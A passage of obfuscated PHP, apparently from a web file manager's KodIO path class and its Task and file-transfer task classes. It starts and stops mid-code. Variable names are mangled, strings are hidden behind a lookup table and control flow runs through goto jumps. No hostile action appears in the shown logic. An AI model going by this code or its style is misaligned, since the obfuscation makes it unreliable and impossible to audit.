"\173\x62\x6c\x6f\143\153\x7d"; const KOD_IO = "\173\151\x6f\x7d"; const KOD_USER_RECENT = "\173\165\x73\145\162\122\145\x6e\x63\145\x6e\x74\x7d"; const KOD_USER_DRIVER = "\173\x64\162\x69\166\x65\x72\175"; public static function typeList() { $C…Âæ½ÊĞç =& $_SERVER[…ë˜õ]; return array($C…Âæ½ÊĞç[1143] => self::KOD_SOURCE, $C…Âæ½ÊĞç[1144] => self::KOD_USER_RECYCLE, $C…Âæ½ÊĞç[1145] => self::KOD_USER_FAV, $C…Âæ½ÊĞç[1146] => self::KOD_USER_FILE_TAG, $C…Âæ½ÊĞç[1147] => self::KOD_USER_FILE_TYPE, $C…Âæ½ÊĞç[1148] => self::KOD_GROUP_ROOT_SELF, $C…Âæ½ÊĞç[1149] => self::KOD_USER_SHARE, $C…Âæ½ÊĞç[1150] => self::KOD_USER_SHARE_LINK, $C…Âæ½ÊĞç[1151] => self::KOD_USER_SHARE_TO_ME, $C…Âæ½ÊĞç[1152] => self::KOD_SHARE_ITEM, $C…Âæ½ÊĞç[1153] => self::KOD_SHARE_LINK, $C…Âæ½ÊĞç[1154] => self::KOD_SEARCH, $C…Âæ½ÊĞç[1155] => self::KOD_BLOCK, $C…Âæ½ÊĞç[1156] => self::KOD_IO, $C…Âæ½ÊĞç[1157] => self::KOD_USER_RECENT, $C…Âæ½ÊĞç[1158] => self::KOD_USER_DRIVER); } public static function parse($FŠ‰ŸÈî³Š) { goto eÙñ¥ Ô²È; F™´‡ëõ¬: $aªŠŸ¾×õ´ = array($AîÕ¾‚Ü¶Ç[33], self::KOD_SOURCE, self::KOD_IO, self::KOD_SHARE_ITEM, self::KOD_SHARE_LINK, self::KOD_USER_DRIVER); $eĞÙÃõÀÛ—[$AîÕ¾‚Ü¶Ç[1124]] = in_array($eĞÙÃõÀÛ—[$AîÕ¾‚Ü¶Ç[29]], $aªŠŸ¾×õ´); return $eĞÙÃõÀÛ—; goto eç—í£ğ–”; eÙñ¥ Ô²È: $AîÕ¾‚Ü¶Ç =& $_SERVER[…ë˜õ]; $FŠ‰ŸÈî³Š = self::clear($FŠ‰ŸÈî³Š); $fù±–¨š‹É = array_values(self::typeList()); goto cÌé™Š‹µö; cÌé™Š‹µö: preg_match($AîÕ¾‚Ü¶Ç[1159], $FŠ‰ŸÈî³Š, $F‰İ™—‚Å”); $eĞÙÃõÀÛ— = array($AîÕ¾‚Ü¶Ç[409] => !1, $AîÕ¾‚Ü¶Ç[1160] => !1, $AîÕ¾‚Ü¶Ç[406] => !1, $AîÕ¾‚Ü¶Ç[75] => $FŠ‰ŸÈî³Š, $AîÕ¾‚Ü¶Ç[1070] => !1, $AîÕ¾‚Ü¶Ç[1069] => $AîÕ¾‚Ü¶Ç[33]); if (is_array($F‰İ™—‚Å”) && count($F‰İ™—‚Å”) == 5) { $bŒñòæĞÈ = $AîÕ¾‚Ü¶Ç[1161] . $F‰İ™—‚Å”[2] . $AîÕ¾‚Ü¶Ç[323]; if (in_array($bŒñòæĞÈ, $fù±–¨š‹É)) { $eĞÙÃõÀÛ—[$AîÕ¾‚Ü¶Ç[1070]] = $F‰İ™—‚Å”[1]; $eĞÙÃõÀÛ—[$AîÕ¾‚Ü¶Ç[29]] = $bŒñòæĞÈ; $eĞÙÃõÀÛ—[$AîÕ¾‚Ü¶Ç[1162]] = substr($bŒñòæĞÈ, 1, -1); $eĞÙÃõÀÛ—[$AîÕ¾‚Ü¶Ç[388]] = $F‰İ™—‚Å”[3]; } $eĞÙÃõÀÛ—[$AîÕ¾‚Ü¶Ç[1069]] = $F‰İ™—‚Å”[4]; } goto F™´‡ëõ¬; eç—í£ğ–”: } public static function isTruePath($dÈöéÙÇ¨á) { goto Eº­¦¾ª­; BŸ¥Êº¤Ä¨: if (strpos($dÈöéÙÇ¨á, $Cæ¹éÛ½Üõ[1127]) === 0) { return !0; } if (strpos($dÈöéÙÇ¨á, $Cæ¹éÛ½Üõ[1163]) === 0) { return !0; } if (strpos($dÈöéÙÇ¨á, $Cæ¹éÛ½Üõ[1163]) === 0) { return !0; } goto FÉæ¶‹¿ã; Eº­¦¾ª­: $Cæ¹éÛ½Üõ =& $_SERVER[…ë˜õ]; if (substr($dÈöéÙÇ¨á, 0, 1) != $Cæ¹éÛ½Üõ[1161]) { return !0; } if (strpos($dÈöéÙÇ¨á, $Cæ¹éÛ½Üõ[395]) === 0) { return !0; } goto BŸ¥Êº¤Ä¨; FÉæ¶‹¿ã: if (strpos($dÈöéÙÇ¨á, $Cæ¹éÛ½Üõ[1164]) === 0) { return !0; } return !1; goto cÒ´˜º¸¾š; cÒ´˜º¸¾š: } public static function clear($E™á¥×”ì§) { goto AÅÎˆÉİÄ’; AÅÎˆÉİÄ’: $FÅñ”èÀÓ =& $_SERVER[…ë˜õ]; $E™á¥×”ì§ = str_replace(array($FÅñ”èÀÓ[1043], $FÅñ”èÀÓ[227]), $FÅñ”èÀÓ[50], $E™á¥×”ì§); $E™á¥×”ì§ = str_replace($FÅñ”èÀÓ[96], $FÅñ”èÀÓ[8], $E™á¥×”ì§); goto dÍà…‰‘…‘; dÍà…‰‘…‘: $Eéƒ ´öÍÒ = $FÅñ”èÀÓ[1165]; if (substr($E™á¥×”ì§, 0, 3) == $FÅñ”èÀÓ[1166]) { $E™á¥×”ì§ = substr($E™á¥×”ì§, 3); } while (strstr($E™á¥×”ì§, $Eéƒ ´öÍÒ)) { $E™á¥×”ì§ = str_replace($Eéƒ ´öÍÒ, $FÅñ”èÀÓ[8], $E™á¥×”ì§); } goto e²×ƒéæªÄ; e²×ƒéæªÄ: $E™á¥×”ì§ = preg_replace($FÅñ”èÀÓ[1167], $FÅñ”èÀÓ[8], $E™á¥×”ì§); if ($E™á¥×”ì§ == $FÅñ”èÀÓ[8]) { return $FÅñ”èÀÓ[8]; } $E™á¥×”ì§ = rtrim($E™á¥×”ì§, $FÅñ”èÀÓ[8]); goto bÇ¯ó ¹«¬; bÇ¯ó ¹«¬: return $E™á¥×”ì§; goto f§ôŒ„ğ; f§ôŒ„ğ: } public static function sourceID($dÂŠîÈ³ŒÍ) { $Eæ¤Ï÷ø¨ =& $_SERVER[…ë˜õ]; $FŠ®ÊßôÑ = self::parse($dÂŠîÈ³ŒÍ); if ($FŠ®ÊßôÑ[$Eæ¤Ï÷ø¨[29]] !== self::KOD_SOURCE) { show_json(LNG($Eæ¤Ï÷ø¨[1168]), !1); } return $FŠ®ÊßôÑ[$Eæ¤Ï÷ø¨[388]]; } public static function make($c…‰ŠïòÍ) { if (!$c…‰ŠïòÍ) { return !1; } return self::makePath(self::KOD_SOURCE, intval($c…‰ŠïòÍ)); } public static function makeShare($aÖÑƒ¤¬Ä–, $Eó”ê’¾¦İ) { return self::makePath(self::KOD_SHARE_ITEM, $aÖÑƒ¤¬Ä–, $Eó”ê’¾¦İ); } public static function makeFileTypePath($fµ”ÚÜ) { return self::makePath(self::KOD_USER_FILE_TYPE, $fµ”ÚÜ); } public static function makeFileTagPath($b¶ØöÍÊ¯©) { return self::makePath(self::KOD_USER_FILE_TAG, $b¶ØöÍÊ¯©); } public static function makePath($FÍöôôø¸, $Eñ†³Àâ­ß = '', $b“ Ö´×©Î = '') { $FÁì¯âîÓƒ =& $_SERVER[…ë˜õ]; $eø££Í¿¤÷ = substr($FÍöôôø¸, 1, -1); $A÷í¼´£ó = $FÁì¯âîÓƒ[1169] . $eø££Í¿¤÷ . $FÁì¯âîÓƒ[1170] . $Eñ†³Àâ­ß . $FÁì¯âîÓƒ[1171]; $A÷í¼´£ó = $b“ Ö´×©Î ? $A÷í¼´£ó . $b“ Ö´×©Î . $FÁì¯âîÓƒ[8] : $A÷í¼´£ó; return $A÷í¼´£ó; } public static function hashPath($CĞ¾¡ƒÆÈ) { goto F¤ˆå‘¦•; BÏ¨›¾Ò—: return $EĞŒî´Ç; goto e»„‘ÓÍì; F¤ˆå‘¦•: $b›Ã­¨¸·Œ =& $_SERVER[…ë˜õ]; $C´Õàé» = is_array($CĞ¾¡ƒÆÈ) ? $CĞ¾¡ƒÆÈ : IO::info($CĞ¾¡ƒÆÈ); $EĞŒî´Ç = _get($C´Õàé», $b›Ã­¨¸·Œ[1172], $b›Ã­¨¸·Œ[33]); goto F“Ÿ®Ëè‚í; F“Ÿ®Ëè‚í: if (!$EĞŒî´Ç && isset($C´Õàé»[$b›Ã­¨¸·Œ[390]])) { $C´Õàé» = IO::info(KodIO::make($C´Õàé»[$b›Ã­¨¸·Œ[390]])); $EĞŒî´Ç = _get($C´Õàé», $b›Ã­¨¸·Œ[1172], $b›Ã­¨¸·Œ[33]); } if (!$EĞŒî´Ç) { $d¬ßïÄá¦ = KodIO::parse($C´Õàé»[$b›Ã­¨¸·Œ[75]]); if (!$d¬ßïÄá¦[$b›Ã­¨¸·Œ[29]]) { $EĞŒî´Ç = IO::hashSimple($C´Õàé»[$b›Ã­¨¸·Œ[75]]); } } if (!$EĞŒî´Ç) { $EĞŒî´Ç = md5($C´Õàé»[$b›Ã­¨¸·Œ[75]] . $C´Õàé»[$b›Ã­¨¸·Œ[77]] . $C´Õàé»[$b›Ã­¨¸·Œ[83]]); } goto BÏ¨›¾Ò—; e»„‘ÓÍì: } public static function initSystemPath() { goto FêÍ¶‰; f¥¤É±¨Ÿ¾: IOHistory::bindEvent(); goto a¦ã¬ß„á; fÆ®êÆğŒ²: define($C‹ƒ˜×ó«â[1175], self::systemPath($C‹ƒ˜×ó«â[1176])); define($C‹ƒ˜×ó«â[1177], self::systemPath($C‹ƒ˜×ó«â[1178])); define($C‹ƒ˜×ó«â[1179], self::systemPath($C‹ƒ˜×ó«â[1180])); goto f¥¤É±¨Ÿ¾; FêÍ¶‰: $C‹ƒ˜×ó«â =& $_SERVER[…ë˜õ]; if (defined($C‹ƒ˜×ó«â[1173])) { return; } define($C‹ƒ˜×ó«â[1173], self::systemPath($C‹ƒ˜×ó«â[1174])); goto fÆ®êÆğŒ²; a¦ã¬ß„á: } public static function systemPath($BÆé­àãù“) { goto dÁ‚ç¶ÑĞ; cºå¢ñ–¢¬: return $cÏŞ£†áˆë; goto fÖãí½ëØ¨; dÁ‚ç¶ÑĞ: $CŞ‘·øï =& $_SERVER[…ë˜õ]; $AÚ²§˜³íŸ = $CŞ‘·øï[1181] . ucfirst($BÆé­àãù“); $cÏŞ£†áˆë = Model($CŞ‘·øï[1129])->get($AÚ²§˜³íŸ); goto F½Õ¦£ÉÊá; F½Õ¦£ÉÊá: if ($cÏŞ£†áˆë) { return $cÏŞ£†áˆë; } if ($BÆé­àãù“ == $CŞ‘·øï[1174]) { $cÏŞ£†áˆë = self::make(Model($CŞ‘·øï[796])->systemRootPathAdd($CŞ‘·øï[500])); } else { $cÏŞ£†áˆë = self::systemPath($CŞ‘·øï[1174]); $Dñ²Ê•§Ì = self::sourceID($cÏŞ£†áˆë); $cÏŞ£†áˆë = self::make(Model($CŞ‘·øï[796])->mkdir($Dñ²Ê•§Ì, $BÆé­àãù“)); } Model($CŞ‘·øï[1129])->set($AÚ²§˜³íŸ, $cÏŞ£†áˆë); goto cºå¢ñ–¢¬; fÖãí½ëØ¨: } public static function systemFolder($e—Ü’ÇÛ‡ ) { $fÅäæñ„– = IO_PATH_SYSTEM_SOURCE . $e—Ü’ÇÛ‡ ; $Bõ÷áè…£è = Cache::get($fÅäæñ„–); if (!$Bõ÷áè…£è) { $E£â„ß‰Æ = IO::infoFull($fÅäæñ„–); if (!$E£â„ß‰Æ) { $Bõ÷áè…£è = IO::mkdir($fÅäæñ„–, REPEAT_SKIP); } else { $Bõ÷áè…£è = $E£â„ß‰Æ[$_SERVER[…ë˜õ][75]]; } Cache::set($fÅäæñ„–, $Bõ÷áè…£è, 3600 * 10); } return $Bõ÷áè…£è; } public static function defaultDriver() { return Model($_SERVER[…ë˜õ][745])->defaultDriver(); } public static function defaultIO() { $E¥ÃÚÁÁÅ… =& $_SERVER[…ë˜õ]; $a£Ì´ƒ…Ùº = self::defaultDriver(); return $E¥ÃÚÁÁÅ…[1182] . $a£Ì´ƒ…Ùº[$E¥ÃÚÁÁÅ…[388]] . $E¥ÃÚÁÁÅ…[1171]; } public static function defaultDriverInit() { static $fƒ“Éó¼£ = false; if ($fƒ“Éó¼£) { return $fƒ“Éó¼£; } $fƒ“Éó¼£ = IO::init(self::defaultIO()); return $fƒ“Éó¼£; } public static function fileTypeList() { $eøˆ‡Şñ¬ =& $_SERVER[…ë˜õ]; $a…‚‚ÍáË = $GLOBALS[$eøˆ‡Şñ¬[6]][$eøˆ‡Şñ¬[1183]]; foreach ($a…‚‚ÍáË as $Eøˆ–”ã¿· => $a²«”µìªó) { $a£Ğ›éÙÁĞ = $eøˆ‡Şñ¬[1184] . $Eøˆ–”ã¿·; $bŸ¥æøà¥ƒ = LNG($a£Ğ›éÙÁĞ); if ($a£Ğ›éÙÁĞ != $bŸ¥æøà¥ƒ) { $a…‚‚ÍáË[$Eøˆ–”ã¿·][$eøˆ‡Şñ¬[28]] = $bŸ¥æøà¥ƒ; } } return $a…‚‚ÍáË; } public static function transferType($f¹¶ÌÍ, $bŠã¹Ç‡Åå) { goto c¡Â†Ú²“; fß¨œë‚‹Ì: if ($céê”ÉÙ†Ø[$fÛ¯‹ôÚ‰¤[29]] == $F²ÉÜ­’ ¶[$fÛ¯‹ôÚ‰¤[29]] && $céê”ÉÙ†Ø[$fÛ¯‹ôÚ‰¤[1185]] == $F²ÉÜ­’ ¶[$fÛ¯‹ôÚ‰¤[1185]]) { return $fÛ¯‹ôÚ‰¤[1186]; } if ($céê”ÉÙ†Ø[$fÛ¯‹ôÚ‰¤[29]] == $fÛ¯‹ôÚ‰¤[836] && $F²ÉÜ­’ ¶[$fÛ¯‹ôÚ‰¤[29]] == $fÛ¯‹ôÚ‰¤[105]) { return $fÛ¯‹ôÚ‰¤[1099]; } if ($céê”ÉÙ†Ø[$fÛ¯‹ôÚ‰¤[29]] == $fÛ¯‹ôÚ‰¤[105] && $F²ÉÜ­’ ¶[$fÛ¯‹ôÚ‰¤[29]] == $fÛ¯‹ôÚ‰¤[836]) { return $fÛ¯‹ôÚ‰¤[106]; } goto Dµ’ŸÇ”ùİ; c¡Â†Ú²“: $fÛ¯‹ôÚ‰¤ =& $_SERVER[…ë˜õ]; $céê”ÉÙ†Ø = self::driverType($f¹¶ÌÍ); $F²ÉÜ­’ ¶ = self::driverType($bŠã¹Ç‡Åå); goto fß¨œë‚‹Ì; Dµ’ŸÇ”ùİ: return $fÛ¯‹ôÚ‰¤[1187]; goto F³Ğ¡Óª„; F³Ğ¡Óª„: } public static function driverType($CÑŒäÄá‘Ü) { goto bÓ¯ğ ÅÂÈ; AŸÕá‹º”·: return array($fßÀŸ’á¿[29] => $fßÀŸ’á¿[836], $fßÀŸ’á¿[1185] => $CÑŒäÄá‘Ü->pathDriver, $fßÀŸ’á¿[75] => $EÕªµÖÈ´©); goto C¢ÊŠ¶†Ùï; bÓ¯ğ ÅÂÈ: $fßÀŸ’á¿ =& $_SERVER[…ë˜õ]; $EÕªµÖÈ´© = $CÑŒäÄá‘Ü->path; $Då†¯’’É = str_replace($fßÀŸ’á¿[1188], $fßÀŸ’á¿[33], strtolower($CÑŒäÄá‘Ü->getType())); goto dêÜé…•µ; dêÜé…•µ: if ($Då†¯’’É == $fßÀŸ’á¿[736] || $Då†¯’’É == $fßÀŸ’á¿[1189] || $Då†¯’’É == $fßÀŸ’á¿[1190]) { $CÑŒäÄá‘Ü = self::defaultDriverInit(); } else { if ($Då†¯’’É == $fßÀŸ’á¿[1106] || $Då†¯’’É == $fßÀŸ’á¿[1191]) { $CÑŒäÄá‘Ü = IO::init($CÑŒäÄá‘Ü->pathParse[$fßÀŸ’á¿[1053]]); } } $Då†¯’’É = str_replace($fßÀŸ’á¿[1188], $fßÀŸ’á¿[33], strtolower($CÑŒäÄá‘Ü->getType())); if ($Då†¯’’É == $fßÀŸ’á¿[105]) { return array($fßÀŸ’á¿[29] => $fßÀŸ’á¿[105], $fßÀŸ’á¿[1185] => $fßÀŸ’á¿[33], $fßÀŸ’á¿[75] => $EÕªµÖÈ´©); } goto AŸÕá‹º”·; C¢ÊŠ¶†Ùï: } } goto F¼‰Ó¾‘¨•; B‘Èà²îÜä: class Task { const STATYS_STOP = "\163\x74\157\160"; const STATYS_RUNNING = "\162\165\156\156\151\156\147"; const STATYS_KILL = "\x6b\x69\154\154"; public $task; public function __destruct() { $this->end(); } public function __construct($eˆ•¶¬œæù, $Fö´ÃÓÍ§ = '', $dåÎ½ĞÒ¢Ò = 0, $BëÚª…­Ö = '') { goto fÇ«š©Ï´à; aµöÀ‚ù¤è: $this->startAfter(); Hook::trigger($BŞšíËâ¶[1541], $this->task); $this->task[$BŞšíËâ¶[1534]] = timeFloat(); goto C´ïßˆ¨î; fÇ«š©Ï´à: $BŞšíËâ¶ =& $_SERVER[…ë˜õ]; if (self::get($eˆ•¶¬œæù)) { return; } $this->task = array($BŞšíËâ¶[388] => $eˆ•¶¬œæù, $BŞšíËâ¶[1531] => USER_ID, $BŞšíËâ¶[1436] => $BëÚª…­Ö, $BŞšíËâ¶[29] => $Fö´ÃÓÍ§, $BŞšíËâ¶[1029] => $BŞšíËâ¶[33], $BŞšíËâ¶[1027] => $dåÎ½ĞÒ¢Ò, $BŞšíËâ¶[1041] => 0, $BŞšíËâ¶[1532] => 0, $BŞšíËâ¶[1533] => 0, $BŞšíËâ¶[762] => timeFloat(), $BŞšíËâ¶[761] => 0, $BŞšíËâ¶[1534] => 0, $BŞšíËâ¶[1535] => 0, $BŞšíËâ¶[1536] => 0, $BŞšíËâ¶[731] => $BŞšíËâ¶[1494]); goto a¼•ÖÖ»Õ; a¼•ÖÖ»Õ: $GLOBALS[$BŞšíËâ¶[1537]] = 1; Hook::bind($BŞšíËâ¶[1496], array($this, $BŞšíËâ¶[1538])); Hook::bind($BŞšíËâ¶[1539], array($this, $BŞšíËâ¶[1540])); goto aµöÀ‚ù¤è; C´ïßˆ¨î: } public function end() { goto dƒª£¯Ïâš; dƒª£¯Ïâš: $eÒ…Ò©Œ =& $_SERVER[…ë˜õ]; if (!$this->task) { return; } if ($this->task[$eÒ…Ò©Œ[1534]]) { self::valueSet($this->task[$eÒ…Ò©Œ[388]], !1); } goto CÉ‚ÈÚÔ’; CÉ‚ÈÚÔ’: $aÕæŒÏ±Ç… = timeFloat() - $this->task[$eÒ…Ò©Œ[762]]; self::log($eÒ…Ò©Œ[1542] . $this->task[$eÒ…Ò©Œ[388]] . $eÒ…Ò©Œ[1543] . $aÕæŒÏ±Ç… . $eÒ…Ò©Œ[1544]); Hook::unbind($eÒ…Ò©Œ[1496], array($this, $eÒ…Ò©Œ[1538])); goto b §†„¡à; b §†„¡à: Hook::unbind($eÒ…Ò©Œ[1539], array($this, $eÒ…Ò©Œ[1540])); $this->endAfter(); $this->task = !1; goto fÚØºïš÷ß; fÚØºïš÷ß: } public function update($aÈÛÉî›’â = 0, $c‰å’”…Ã = false) { goto e×¯óÑ‚ïâ; A×ÆöÇ¹Ç›: $CšÑïˆÔ×ˆ[$aï¦–¸éèñ[731]] = $B‘ƒãŞˆØ‚ ? $B‘ƒãŞˆØ‚ : $CšÑïˆÔ×ˆ[$aï¦–¸éèñ[731]]; $CšÑïˆÔ×ˆ[$aï¦–¸éèñ[1535]] = $a”ìßô©ñË[$aï¦–¸éèñ[1535]] ? $a”ìßô©ñË[$aï¦–¸éèñ[1535]] : 0; $CšÑïˆÔ×ˆ[$aï¦–¸éèñ[1534]] = timeFloat(); goto f›‚‚µƒ†; b¹ßù—Ö”Í: $CšÑïˆÔ×ˆ[$aï¦–¸éèñ[1041]] += $aÈÛÉî›’â; $CšÑïˆÔ×ˆ[$aï¦–¸éèñ[761]] = timeFloat(); if ($CšÑïˆÔ×ˆ[$aï¦–¸éèñ[1027]]) { if ($CšÑïˆÔ×ˆ[$aï¦–¸éèñ[1027]] < $CšÑïˆÔ×ˆ[$aï¦–¸éèñ[1041]]) { $CšÑïˆÔ×ˆ[$aï¦–¸éèñ[1027]] = $CšÑïˆÔ×ˆ[$aï¦–¸éèñ[1041]]; } $cİóÈ¼µ‡ô = timeFloat() - $CšÑïˆÔ×ˆ[$aï¦–¸éèñ[762]] - $CšÑïˆÔ×ˆ[$aï¦–¸éèñ[1535]]; $CšÑïˆÔ×ˆ[$aï¦–¸éèñ[1532]] = $CšÑïˆÔ×ˆ[$aï¦–¸éèñ[1041]] / $CšÑïˆÔ×ˆ[$aï¦–¸éèñ[1027]]; $CšÑïˆÔ×ˆ[$aï¦–¸éèñ[1533]] = $CšÑïˆÔ×ˆ[$aï¦–¸éèñ[1041]] / $cİóÈ¼µ‡ô; if ($CšÑïˆÔ×ˆ[$aï¦–¸éèñ[1532]] > 0) { $CšÑïˆÔ×ˆ[$aï¦–¸éèñ[1536]] = $cİóÈ¼µ‡ô * (1 - $CšÑïˆÔ×ˆ[$aï¦–¸éèñ[1532]]) / $CšÑïˆÔ×ˆ[$aï¦–¸éèñ[1532]]; } $CšÑïˆÔ×ˆ[$aï¦–¸éèñ[1536]] = $CšÑïˆÔ×ˆ[$aï¦–¸éèñ[1536]] <= 0 ? 0 : $CšÑïˆÔ×ˆ[$aï¦–¸éèñ[1536]]; } goto Cø‡ÀŠ„èÍ; a“¤™êÊÒ›: $a”ìßô©ñË = self::get($CšÑïˆÔ×ˆ[$aï¦–¸éèñ[388]]); $B‘ƒãŞˆØ‚ = $a”ìßô©ñË[$aï¦–¸éèñ[731]]; if ($B‘ƒãŞˆØ‚ == self::STATYS_KILL) { $FšÁ¼¾¿×É = array($aï¦–¸éèñ[1545] => LNG($aï¦–¸éèñ[1546]), $aï¦–¸éèñ[1091] => !1); Cache::set($aï¦–¸éèñ[1547] . $this->task[$aï¦–¸éèñ[388]], $FšÁ¼¾¿×É, 30); $this->end(); die; } else { if ($B‘ƒãŞˆØ‚ == self::STATYS_STOP) { $aù‰¤ßŒ÷š = 2; $a”ìßô©ñË[$aï¦–¸éèñ[1535]] += $aù‰¤ßŒ÷š; self::valueSet($CšÑïˆÔ×ˆ[$aï¦–¸éèñ[388]], $a”ìßô©ñË); sleep($aù‰¤ßŒ÷š); $this->update(); return; } } goto A×ÆöÇ¹Ç›; e×¯óÑ‚ïâ: $aï¦–¸éèñ =& $_SERVER[…ë˜õ]; $CšÑïˆÔ×ˆ =& $this->task; if (!$CšÑïˆÔ×ˆ) { return; } goto b¹ßù—Ö”Í; f›‚‚µƒ†: Hook::trigger($aï¦–¸éèñ[1548], $CšÑïˆÔ×ˆ); self::valueSet($CšÑïˆÔ×ˆ[$aï¦–¸éèñ[388]], $CšÑïˆÔ×ˆ); goto eéÎ˜ÓÛÀ; Cø‡ÀŠ„èÍ: $this->updateAfter(); $e›Íª³ù—Ù = 0.2; if (timeFloat() - $CšÑïˆÔ×ˆ[$aï¦–¸éèñ[1534]] < $e›Íª³ù—Ù && !$c‰å’”…Ã) { return; } goto a“¤™êÊÒ›; eéÎ˜ÓÛÀ: } protected function updateAfter() { } protected function startAfter() { } protected function endAfter() { } public function shutdownEvent() { $this->end(); } public function showJson($b¹¢Îò«¤ö) { $CóÕµéßÔ÷ =& $_SERVER[…ë˜õ]; Cache::set($CóÕµéßÔ÷[1547] . $this->task[$CóÕµéßÔ÷[388]], $b¹¢Îò«¤ö, 60); return $b¹¢Îò«¤ö; } public static function get($c½¡›÷Ç•) { return self::valueGet($c½¡›÷Ç•); } public static function listData() { $A´™¨é»Ò = self::valueGet(); return array_sort_by($A´™¨é»Ò, $_SERVER[…ë˜õ][762], !0); } public static function kill($AÒºÚİÖÂ) { return self::changeStatus($AÒºÚİÖÂ, self::STATYS_KILL); } public static function stop($bÎÊôö™‡ª) { return self::changeStatus($bÎÊôö™‡ª, self::STATYS_STOP); } public static function restart($c³††õó„Ğ) { return self::changeStatus($c³††õó„Ğ, self::STATYS_RUNNING); } public static function killAll() { $C»ÒÒ¼äÚ =& $_SERVER[…ë˜õ]; $eÅ˜¸¥Ìö’ = self::listData(); foreach ($eÅ˜¸¥Ìö’ as $BçøËï›±­) { self::kill($BçøËï›±­[$C»ÒÒ¼äÚ[388]]); } sleep(2); foreach ($eÅ˜¸¥Ìö’ as $BçøËï›±­) { self::valueSet($BçøËï›±­[$C»ÒÒ¼äÚ[388]], !1); } } private static function changeStatus($fÃÕ­êÔï¬, $Dí„™ÆˆŒ) { goto c‚ÌÛÁ—ßÜ; C±¹•Öé©ã: return !0; goto cÂ­Âì¡î; c‚ÌÛÁ—ßÜ: $Bó¬¼Á¢ê =& $_SERVER[…ë˜õ]; $CŒƒÖêÂÈ = self::valueGet($fÃÕ­êÔï¬); if (!$CŒƒÖêÂÈ) { return !1; } goto dğ´‡¦¼¡; dğ´‡¦¼¡: $CŒƒÖêÂÈ[$Bó¬¼Á¢ê[731]] = $Dí„™ÆˆŒ; self::valueSet($fÃÕ­êÔï¬, $CŒƒÖêÂÈ); self::log($Bó¬¼Á¢ê[1549] . $CŒƒÖêÂÈ[$Bó¬¼Á¢ê[388]] . $Bó¬¼Á¢ê[1550] . $Dí„™ÆˆŒ); goto C±¹•Öé©ã; cÂ­Âì¡î: } public static function valueGet($BÇÊåºƒ’” = false) { $CÀñµĞîóŸ =& $_SERVER[…ë˜õ]; if ($BÇÊåºƒ’”) { $Dİä¸“½´ô = Model($CÀñµĞîóŸ[419])->where(array($CÀñµĞîóŸ[92] => $BÇÊåºƒ’”, $CÀñµĞîóŸ[29] => $CÀñµĞîóŸ[1551]))->find(); return $Dİä¸“½´ô ? json_decode($Dİä¸“½´ô[$CÀñµĞîóŸ[370]], !0) : !1; } return self::taskListUser(USER_ID); } public static function taskListUser($C»¤è™éãÚ = false) { goto cÍÜô†äˆ; FôÎĞ²É¸: return $D†É²ä‚ùÑ; goto E­¶Ï÷åŒ; e’Ò¡âšĞ³: $D†É²ä‚ùÑ = Model($CÊ¥ØÓòà¥[419])->where($cÔª³âŞŠ¨)->select(); $D†É²ä‚ùÑ = $D†É²ä‚ùÑ ? $D†É²ä‚ùÑ : array(); foreach ($D†É²ä‚ùÑ as $eÍ´áí£³× => $b—İø¨™Œˆ) { $D†É²ä‚ùÑ[$eÍ´áí£³×] = json_decode($b—İø¨™Œˆ[$CÊ¥ØÓòà¥[370]], !0); } goto FôÎĞ²É¸; cÍÜô†äˆ: $CÊ¥ØÓòà¥ =& $_SERVER[…ë˜õ]; $cÔª³âŞŠ¨ = array($CÊ¥ØÓòà¥[29] => $CÊ¥ØÓòà¥[1551]); if ($C»¤è™éãÚ) { $cÔª³âŞŠ¨[$CÊ¥ØÓòà¥[1531]] = $C»¤è™éãÚ; } goto e’Ò¡âšĞ³; E­¶Ï÷åŒ: } public static function valueSet($eåù„™˜œˆ, $aà’—à³›Á) { goto D›•Õ¡ÚùË; fñ½‡Åé¹İ: Model($a‘®ˆ”¬Â[419])->add($a¾©ÓÊ÷’», array(), !0); goto eÇ‰Ä†–; D›•Õ¡ÚùË: $a‘®ˆ”¬Â =& $_SERVER[…ë˜õ]; if (!$aà’—à³›Á) { return Model($a‘®ˆ”¬Â[419])->where(array($a‘®ˆ”¬Â[92] => $eåù„™˜œˆ, $a‘®ˆ”¬Â[29] => $a‘®ˆ”¬Â[1551]))->delete(); } $Eàê¡ãÏ = json_encode($aà’—à³›Á); goto bùë»ËßŞè; bùë»ËßŞè: if (!$Eàê¡ãÏ) { ob_start(); var_dump($aà’—à³›Á); $EˆÌ»¼›Æä = ob_get_clean(); self::log($a‘®ˆ”¬Â[1552] . json_encode_force($EˆÌ»¼›Æä)); } if (!$eåù„™˜œˆ || !$aà’—à³›Á[$a‘®ˆ”¬Â[388]]) { return !1; } $a¾©ÓÊ÷’» = array($a‘®ˆ”¬Â[29] => $a‘®ˆ”¬Â[1551], $a‘®ˆ”¬Â[1531] => USER_ID, $a‘®ˆ”¬Â[92] => $eåù„™˜œˆ, $a‘®ˆ”¬Â[370] => $Eàê¡ãÏ); goto fñ½‡Åé¹İ; eÇ‰Ä†–: } public static function log($F­øÜ…®»±) { if (!GLOBAL_DEBUG) { return; } write_log($F­øÜ…®»±, $_SERVER[…ë˜õ][1553]); } } class TaskFileTransfer extends Task { protected function startAfter() { goto dƒŠÊİµÓÔ; aÃ„ó™ì: $dÈ‘èùŞ…™[$bäò¬Îù¤À[1578]] = 0; $dÈ‘èùŞ…™[$bäò¬Îù¤À[1579]] = 0; if (!$dÈ‘èùŞ…™[$bäò¬Îù¤À[1436]]) { $dÈ‘èùŞ…™[$bäò¬Îù¤À[1436]] = LNG($bäò¬Îù¤À[1580]); } goto BÃƒ‚’îÃÃ; B„Ï¿¦Œ°ƒ: Hook::bind($bäò¬Îù¤À[1563], array($this, $bäò¬Îù¤À[1564])); Hook::bind($bäò¬Îù¤À[554], array($this, $bäò¬Îù¤À[1565])); $this->sourceModelCopyFlag = !1; goto B¡ßŞéå‹‘; dƒŠÊİµÓÔ: $bäò¬Îù¤À =& $_SERVER[…ë˜õ]; $dÈ‘èùŞ…™ =& $this->task; $this->sourceCopyFolder = !1; goto DÑ¬„­Ğ©; fœÀòÓ¤¨Ÿ: $dÈ‘èùŞ…™[$bäò¬Îù¤À[1572]] = LNG($bäò¬Îù¤À[1573]); $dÈ‘èùŞ…™[$bäò¬Îù¤À[1574]] = 0; $dÈ‘èùŞ…™[$bäò¬Îù¤À[1575]] = 0; goto D›„§³é; B¡ßŞéå‹‘: Hook::bind($bäò¬Îù¤À[1566], array($this, $bäò¬Îù¤À[1567])); Hook::bind($bäò¬Îù¤À[1568], array($this, $bäò¬Îù¤À[1569])); Hook::bind($bäò¬Îù¤À[1570], array($this, $bäò¬Îù¤À[1571])); goto 